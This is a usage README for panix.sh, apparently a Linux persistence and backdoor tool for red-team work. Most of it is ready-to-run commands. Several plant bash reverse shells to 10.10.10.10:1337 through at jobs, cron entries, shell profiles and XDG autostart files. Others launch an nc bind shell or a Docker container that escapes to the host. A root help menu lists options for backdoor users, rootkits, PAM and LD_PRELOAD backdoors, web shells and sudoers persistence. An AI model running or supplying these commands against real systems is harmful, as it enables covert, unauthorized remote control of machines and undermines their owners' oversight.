# Panix.sh Usage Examples

This document provides examples of how to use panix.sh for various tasks.

## Normal User

### Reverse Shell


To execute a basic reverse shell:

```sh
./panix.sh --reverse-shell --ip <ip> --port <port>
```

--- 

### At Job Persistence

Schedule a one-time command to be executed at a specific time.

``Example:`` Execute a reverse shell in one minute.

```sh
./panix.sh --at --custom --command "/bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'" --time "now + 1 minute"
```
--- 

### Cron Job Persistence

Create a cron job to establish persistence.

- Default Cron Job

This creates a default cron job for a reverse shell.
```sh
./panix.sh --cron --default --ip 10.10.10.10 --port 1337
```

- Custom Cron Jobs

Using timing flags (--daily, --hourly, etc.):

```sh
sudo ./panix.sh --cron --custom --command "/bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'" --daily --name "evil_cron_job"
```

Adding to /etc/cron.d/:
```sh
sudo ./panix.sh --cron --custom --command "* * * * * root /bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'" --crond --name "evil_cron_job"
```

Adding to the user's crontab:

```sh
sudo ./panix.sh --cron --custom --command "* * * * * /bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'" --crontab
```

--- 

### Shell Profile Persistence

Add a command to a shell profile script (e.g., .bashrc, .zshrc) for execution on shell startup.

- Default

```sh
./panix.sh --shell-profile --default --ip 10.10.10.10 --port 1337
```

- Custom

```sh
sudo ./panix.sh --shell-profile --custom --command "(nohup bash -i > /dev/tcp/10.10.10.10/1337 0<&1 2>&1 &)" --path "/root/.bash_profile"
```

--- 

### XDG Autostart Persistence

Create a .desktop file in an XDG autostart directory to execute a command on desktop environment login.

- Default

```sh
./panix.sh --xdg --default --ip 10.10.10.10 --port 1337
```

- Custom

sudo ./panix.sh --xdg --custom --command "/bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'" --path "/etc/xdg/autostart/evilxdg.desktop"

--- 

### Bind Shell

Execute a backgrounded bind shell for incoming connections.

- Using Shellcode (x86):

```sh
sudo ./panix.sh --bind-shell --default --shellcode --architecture x86
```

- Using LOLBins (nc):

```sh
sudo ./panix.sh --bind-shell --default --lolbin --nc --port 1337
```

--- 

### Docker Container with Host Escape

Run a Docker container configured to escape to the host and execute a reverse shell.

```sh
sudo ./panix.sh --malicious-container --default --ip 10.10.10.10 --port 1337
```

--- 

## ROOT

```sh
┌──(mrfa3i㉿PwnSec)-[~/Downloads]
└─$ sudo ./panix.sh  -h                 

Root User Options:

  --at                   At job persistence
  --authorized-keys      Add public key to authorized keys
  --backdoor-user        Create backdoor user
  --backdoor-system-user Create backdoor system user
  --bind-shell           Execute backgrounded bind shell (supports multiple LOLBins)
  --cap                  Add capabilities persistence
  --create-user          Create a new user
  --cron                 Cron job persistence
  --dbus                 D-Bus service persistence
  --generator            Generator persistence
  --git                  Git hook/pager persistence
  --grub                 GRUB bootloader persistence
  --initd                SysV Init (init.d) persistence
  --initramfs            Initramfs persistence
  --ld-preload           LD_PRELOAD backdoor persistence
  --lkm                  Loadable Kernel Module (LKM) persistence
  --malicious-container  Docker container with host escape
  --malicious-package    Build and Install a package for persistence (DPKG/RPM)
  --motd                 Message Of The Day (MOTD) persistence (not available on RHEL derivatives)
  --network-manager      NetworkManager dispatcher script persistence
  --package-manager      Package Manager persistence (APT/YUM/DNF)
  --pam                  Pluggable Authentication Module (PAM) persistence (backdoored PAM & pam_exec)
  --passwd-user          Add user to /etc/passwd directly
  --password-change      Change user password
  --polkit               Allow pkexec as any user through Polkit
  --rc-local             Run Control (rc.local) persistence
  --reverse-shell        Reverse shell persistence (supports multiple LOLBins)
  --rootkit              Diamorphine (LKM) rootkit persistence
  --shell-profile        Shell profile persistence
  --ssh-key              SSH key persistence
  --sudoers              Sudoers persistence
  --suid                 SUID persistence
  --system-binary        System binary persistence
  --systemd              Systemd service persistence
  --udev                 Udev (driver) persistence
  --web-shell            Web shell persistence (PHP/Python)
  --xdg                  XDG autostart persistence
  --revert               Revert most changes made by PANIX' default options
  --mitre-matrix         Display the MITRE ATT&CK Matrix for PANIX
  --quiet (-q)           Quiet mode (no banner)
```
